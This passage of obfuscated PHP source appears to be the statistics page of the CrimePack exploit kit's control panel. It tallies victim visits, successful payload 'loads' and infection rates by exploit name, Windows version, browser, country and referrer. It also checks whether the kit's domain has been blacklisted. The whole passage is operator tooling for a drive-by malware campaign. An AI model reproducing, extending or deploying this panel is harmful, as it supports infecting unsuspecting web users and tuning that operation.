            if( 1 < strlen($_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["referer"]) ) 
            {
                $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["referrers"][$_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_["referer"]]["hits"]++;
            }

        }

        arsort($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["segadora1"]);
        arsort($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["referrers"]);
    }
    showheader();
    switch( $stats ) 
    {
        case "all":
            echo "\r\n      <table class=\"tbl2\" width=\"800\"><tr>\r\n      <td class=\"tdtoptable\" width=\"800\" align=\"center\"><b>overall stats</b></td></tr></table>\r\n      <center>\r\n      <table class=\"tbl1\" width=\"800\"><tr class=\"columns\">\r\n      <td align=\"center\" width=\"150\" class=\"td1\"><b>unique hits</b></td>\r\n      <td align=\"center\" width=\"150\" class=\"td1\"><b>loads</b></td>\r\n      <td align=\"center\" width=\"150\" class=\"td1\"><b>exploit rate</b></td>\r\n      </tr>\r\n      <td align=\"center\" class=\"tdx1\" width=\"80\">" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["hits"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["hits"] : "0")) . "</td>\r\n      <td align=\"center\" class=\"tdx1\" width=\"80\">" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads"] : "0")) . "</td>\r\n      <td align=\"center\" class=\"tdx1\" width=\"80\">" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads"]) ? getrate($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads"], $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["hits"]) : "0")) . "%</td>\r\n      </table>\r\n      </center>";
            $array = array( "iepeers", "msiemc", "pdf", "mdac", "hcp", "java", "webstart", "java-getval", "activex", "other", "aggressive" );
            echo "\r\n      <table class=\"tbl2\" width=\"800\"><tr>\r\n      <td class=\"tdtoptable\" width=\"800\" align=\"center\"><b>exploit stats</b></td></tr></table>\r\n      <table class=\"tbl1\" width=\"800\"><tr>\r\n      ";
            foreach( $array as $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_ ) 
            {
                echo "\r\n      <td align=\"center\" class=\"td1\" width=\"150\"><b>" . $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_ . "</b></td>";
            }
            echo "\r\n      </tr>\r\n      ";
            foreach( $array as $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_ ) 
            {
                echo "<td align=\"center\" class=\"tdx1\" width=\"80\">" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["load_" . $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["load_" . $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_] : "0")) . "</td>";
            }
            echo "\r\n      </table>\r\n      ";
            if( $cpMySQL->DataDecrypt(BADTRAFF) ) 
            {
                $array = array( "2k", "2k3", "xp", "vista", "seven" );
            }
            else
            {
                $array = array( "2k", "2k3", "xp", "vista" );
            }

            echo "\r\n      <table class=\"tbl2\" width=\"800\"><tr>\r\n      <td class=\"tdtoptable\" width=\"800\" align=\"center\"><b>os stats</b></td></tr></table>\r\n      <table class=\"tbl1\" width=\"800\">\r\n      <tr>\r\n      <td align=\"center\" class=\"td1\" width=\"200\"><b>os</b></td>\r\n      <td align=\"center\" class=\"td1\" width=\"100\"><b>hits</b></td>\r\n      <td align=\"center\" class=\"td1\" width=\"70\"><b>loads</b></td>\r\n      <td align=\"center\" class=\"td1\" width=\"70\"><b>rate</b></td>\r\n      </tr>\r\n      ";
            $i = 0;
            foreach( $array as $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_ ) 
            {
                $i++;
                $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ = ($i % 2 == 0 ? "1" : "2");
                echo "\r\n      <tr>\r\n      <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"150\"><b>windows " . $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_ . "</b></td>\r\n      <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"80\">" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["os"][$_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["os"][$_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_] : "0")) . "</td>\r\n      <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"80\">" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_" . $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_" . $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_] : "0")) . "</td>\r\n      <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"80\">" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_" . $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_]) ? getrate($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_" . $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_], $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["os"][$_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_]) : "0")) . "%</td>\r\n      </tr>";
            }
            echo "\r\n      </table>\r\n      <table class=\"tbl2\" width=\"800\"><tr><td class=\"tdtoptable\" width=\"800\" align=\"center\"><b>browser stats</b></td></tr></table>\r\n      <table class=\"tbl1\" width=\"800\">\r\n      <tr>\r\n      <td align=\"center\" class=\"td1\" width=\"15%\" height=\"32\"><img src=img/1.png width=\"30\" height=\"30\"></td>\r\n      <td align=\"center\" class=\"td1\" width=\"15%\" height=\"32\"><img src=img/2.png width=\"30\" height=\"30\"></td>\r\n      <td align=\"center\" class=\"td1\" width=\"15%\" height=\"32\"><img src=img/3.png width=\"30\" height=\"30\"></td>";
            if( $cpMySQL->DataDecrypt(BADTRAFF) ) 
            {
                echo " <td align=\"center\" class=\"td1\" width=\"15%\" height=\"32\"><img src=img/4.png width=\"30\" height=\"30\"></td>";
            }

            echo "\r\n      </tr><tr>\r\n      <td align=\"center\" class=\"tdx1\" width=\"300\"><b>" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ie"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ie"] : "0")) . "</b> (<b>" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ie"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ie"] : "0")) . "</b> loads) " . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ie"]) ? getrate($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ie"], (isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ie"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ie"] : "0")) : 0)) . "%</td>\r\n      <td align=\"center\" class=\"tdx1\" width=\"300\"><b>" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ff"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ff"] : "0")) . "</b> (<b>" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ff"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ff"] : "0")) . "</b> loads) " . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ff"]) ? getrate($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ff"], (isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ff"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ff"] : "0")) : 0)) . "%</td>\r\n      <td align=\"center\" class=\"tdx1\" width=\"300\"><b>" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["op"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["op"] : "0")) . "</b> (<b>" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_op"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_op"] : "0")) . "</b> loads) " . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_op"]) ? getrate($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_op"], (isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["op"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["op"] : "0")) : 0)) . "%</td>";
            if( $cpMySQL->DataDecrypt(BADTRAFF) ) 
            {
                echo "<td align=\"center\" class=\"tdx1\" width=\"300\"><b>" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ch"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ch"] : "0")) . "</b> (<b>" . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ch"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ch"] : "0")) . "</b> loads) " . ((isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ch"]) ? getrate($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["loads_ch"], (isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ch"]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["browsers"]["ch"] : "0")) : 0)) . "%</td>";
            }

            echo "\r\n      </tr></table>";
            if( 0 < count($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["segadora1"]) ) 
            {
                echo "<table class=\"tbl2\" width=\"800\"><tr>\r\n         <td class=\"tdtoptable\" width=\"800\" align=\"center\"><b>top countries</b></td></tr></table>\r\n         <table class=\"tbl1\" width=\"800\">\r\n         <tr>\r\n         <td align=\"center\" class=\"td1\" width=\"20\"></td>\r\n         <td align=\"center\" class=\"td1\" width=\"200\"><b>country</b></td>\r\n         <td align=\"center\" class=\"td1\" width=\"100\"><b>hits</b></td>\r\n         <td align=\"center\" class=\"td1\" width=\"70\"><b>loads</b></td>\r\n         <td align=\"center\" class=\"td1\" width=\"70\"><b>rate</b></td>\r\n         </tr>";
                $i = 0;
                foreach( $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["segadora1"] as $key => $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_ ) 
                {
                    $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_ = $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["countries"][$key];
                    $i++;
                    $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ = ($i % 2 == 0 ? "1" : "2");
                    echo "<tr>\r\n            <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"20\"><img src=\"showflag.php?country=" . strtolower($key) . "\" border=0 height=10></td>\r\n            <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"200\">" . CPGeoIP::getcountrynamebyshort($key) . "</td>\r\n            <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"100\">" . $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["hits"] . "</td>\r\n            <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"70\">" . ((isset($_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"]) ? $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"] : 0)) . "</td>\r\n            <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"70\">" . ((isset($_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"]) ? getrate($_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"], $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["hits"]) : 0)) . "%</td>\r\n            </tr>";
                    if( $i == 10 ) 
                    {
                        break;
                    }

                }
                echo "</table>";
            }

            break;
        case "countries":
            if( 0 < count($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["countries"]) ) 
            {
                echo "<table class=\"tbl2\" width=\"800\"><tr>\r\n               <td class=\"tdtoptable\" width=\"800\" align=\"center\"><b>countries</b></td></tr></table>\r\n               <table class=\"tbl1\" width=\"800\">\r\n               <tr>\r\n               <td align=\"center\" class=\"td1\" width=\"20\"></td>\r\n               <td align=\"center\" class=\"td1\" width=\"200\"><b>country</b></td>\r\n               <td align=\"center\" class=\"td1\" width=\"100\"><b>hits</b></td>\r\n               <td align=\"center\" class=\"td1\" width=\"70\"><b>loads</b></td>\r\n               <td align=\"center\" class=\"td1\" width=\"70\"><b>rate</b></td>\r\n               </tr>";
                $i = 0;
                foreach( $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["countries"] as $key => $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_ ) 
                {
                    $i++;
                    $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ = ($i % 2 == 0 ? "1" : "2");
                    echo "<tr>\r\n                  <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"20\"><img src=\"showflag.php?country=" . strtolower($key) . "\" border=0 height=10></td>\r\n                  <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"200\">" . CPGeoIP::getcountrynamebyshort($key) . "</td>\r\n                  <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"100\">" . $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["hits"] . "</td>\r\n                  <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"70\">" . ((isset($_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"]) ? $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"] : 0)) . "</td>\r\n                  <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"70\">" . ((isset($_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"]) ? getrate($_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"], $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["hits"]) : 0)) . "%</td>\r\n                  </tr>";
                }
                echo "</table>";
            }
            else
            {
                echo "<table class=\"tbl2\" width=\"800\"><tr>\r\n                     <td class=\"tdtoptable\" width=\"800\" align=\"center\"><b>countries</b></td></tr></table>\r\n                     <table class=\"tbl1\" width=\"800\">\r\n                     <tr>\r\n                     <td align=\"center\" class=\"td1\" width=\"20\"></td>\r\n                     <td align=\"center\" class=\"td1\" width=\"200\"><b>country</b></td>\r\n                     <td align=\"center\" class=\"td1\" width=\"100\"><b>hits</b></td>\r\n                     <td align=\"center\" class=\"td1\" width=\"70\"><b>loads</b></td>\r\n                     <td align=\"center\" class=\"td1\" width=\"70\"><b>rate</b></td>\r\n                     </tr>\r\n                     <tr>\r\n                     <td align=\"center\" class=\"tdx1\" width=\"20\">N/A</td>\r\n                     <td align=\"center\" class=\"tdx1\" width=\"200\">N/A</td>\r\n                     <td align=\"center\" class=\"tdx1\" width=\"100\">N/A</td>\r\n                     <td align=\"center\" class=\"tdx1\" width=\"70\">N/A</td>\r\n                     <td align=\"center\" class=\"tdx1\" width=\"70\">N/A</td>\r\n                     </tr></table>";
            }

            break;
        case "advstats":
            $array = array( "iepeers", "msiemc", "pdf", "libtiff", "mdac", "java", "webstart", "OfficeViewer", "Peachtree", "Hummingbird", "SymantecWorkspace", "MSDDS", "Snapshot", "QuicktimeRTSP", "WindowsMediaEncoder", "Zenturi", "ICQPhone", "Facebookphoto", "RealPlayerConsole", "Yahoo", "Zango", "SuperBuddy", "WKS", "Sina", "aggressive" );
            echo "<center>\r\n               <table class=\"tbl2\" width=\"800\"><tr>\r\n               <td class=\"tdtoptable\" width=\"800\" align=\"center\"></b>advanced exploit stats</b></td></tr></table>\r\n               <table class=\"tbl1\" width=\"800\">\r\n               <tr>\r\n               <td align=\"center\" class=\"td1\" width=\"200\"><b>exploit</b></td>\r\n               <td align=\"center\" class=\"td1\" width=\"100\"><b>loads</b></td>\r\n               </tr></center>";
            $i = 0;
            $_obfuscated_0D2B39383D1225094031020F172F3D280F1F28123B2722_ = array(  );
            foreach( $array as $_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_ ) 
            {
                $_obfuscated_0D2B39383D1225094031020F172F3D280F1F28123B2722_[$_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_] = (isset($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["extra"][$_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_]) ? $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["crimepack"]["extra"][$_obfuscated_0D1C350813323D1B1B30260209273B3B1D06371B293222_] : 0);
            }
            arsort($_obfuscated_0D2B39383D1225094031020F172F3D280F1F28123B2722_);
            foreach( $_obfuscated_0D2B39383D1225094031020F172F3D280F1F28123B2722_ as $key => $value ) 
            {
                $i++;
                $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ = ($i % 2 == 0 ? "1" : "2");
                echo "\r\n               <tr><td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"300\">" . strtolower($key) . "</td>\r\n               <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"70\">" . $value . "</td></tr>";
            }
            echo "\r\n            </table>\r\n            ";
            break;
        case "referrers":
            if( 0 < count($_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["referrers"]) ) 
            {
                echo "<table class=\"tbl2\" width=\"800\"><tr>\r\n               <td class=\"tdtoptable\" width=\"800\" align=\"center\"></b>referrer</b></td></tr></table>\r\n               <table class=\"tbl1\" width=\"800\">\r\n               <tr>\r\n               <td align=\"center\" class=\"td1\" width=\"200\"><b>referrer</b></td>\r\n               <td align=\"center\" class=\"td1\" width=\"100\"><b>hits</b></td>\r\n               <td align=\"center\" class=\"td1\" width=\"70\"><b>loads</b></td>\r\n               <td align=\"center\" class=\"td1\" width=\"70\"><b>rate</b></td>\r\n               </tr>";
                $i = 0;
                foreach( $_obfuscated_0D3D380B03143C3818161A2D3E185C2D3B031E09250722_["referrers"] as $_obfuscated_0D26392A40362E351B333424100A2E051022371F3B3901_ => $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_ ) 
                {
                    $i++;
                    $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ = ($i % 2 == 0 ? "1" : "2");
                    echo "<tr>\r\n                  <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"300\">" . $_obfuscated_0D26392A40362E351B333424100A2E051022371F3B3901_ . "</td>\r\n                  <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"70\">" . $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["hits"] . "</td>\r\n                  <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"70\">" . ((isset($_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"]) ? $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"] : 0)) . "</td>\r\n                  <td align=\"center\" class=\"tdx" . $_obfuscated_0D042E0A232F3B06170D2A1E195C31321C0409371D0E01_ . "\" width=\"70\">" . ((isset($_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"]) ? getrate($_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["loads"], $_obfuscated_0D2A261B3C213F020522262E110C123D0F3922275C2901_["hits"]) : 0)) . "%</td>\r\n                  </tr>";
                }
                while( $_obfuscated_0D223E010D243E061D3737043E3B225B5B2B0208250411_ = mysql_fetch_array($result) ) 
                {
                }
                echo "</table>";
            }
            else
            {
                echo "<table class=\"tbl2\" width=\"800\"><tr>\r\n               <td class=\"tdtoptable\" width=\"800\" align=\"center\"><b>referrer</b></td></tr></table>\r\n               <table class=\"tbl1\" width=\"800\">\r\n               <tr>\r\n               <td align=\"center\" class=\"td1\" width=\"200\"><b>referrer</b></td>\r\n               <td align=\"center\" class=\"td1\" width=\"100\"><b>hits</b></td>\r\n               <td align=\"center\" class=\"td1\" width=\"70\"><b>loads</b></td>\r\n               <td align=\"center\" class=\"td1\" width=\"70\"><b>rate</b></td>\r\n               </tr>\r\n               <tr>\r\n               <td align=\"center\" class=\"tdx1\" width=\"300\">N/A</td>\r\n               <td align=\"center\" class=\"tdx1\" width=\"70\">N/A</td>\r\n               <td align=\"center\" class=\"tdx1\" width=\"70\">N/A</td>\r\n               <td align=\"center\" class=\"tdx1\" width=\"70\">N/A</td>\r\n               </tr></table>";
            }

    }
    echo "</td></tr></table><br />";
    if( isset($_GET["new"]) && $cpMySQL->DataDecrypt(AUTOCHECK) ) 
    {
        echo "<center><table class=\"tbl2\" width=\"100%\" height=\"20\"><tbody><tr>\r\n      <td class=\"footer\" align=\"center\" width=\"100%\" height=\"20\">\r\n   <script type=\"text/javascript\" src=\"ajax.js\"></script>\r\n      <center>\r\n      <script type=\"text/javascript\" defer>\r\n      function checkurl(){\r\n         ajax_load('CP-ENC-5364.php?summary=1&URL=" . $cpMySQL->DataDecrypt(DOMAIN) . "', 'malwarecheck','img/loading.gif','Checking DNS Blacklist...');\r\n      }\r\n      </script>\r\n      <body onLoad=\"checkurl();\">\r\n      <div id='malwarecheck'></div>\r\n      </td></tr></tbody></table></center>";
    }

    echo "<br /><br /><!-- ID: " . $pid . " !! -->";
}


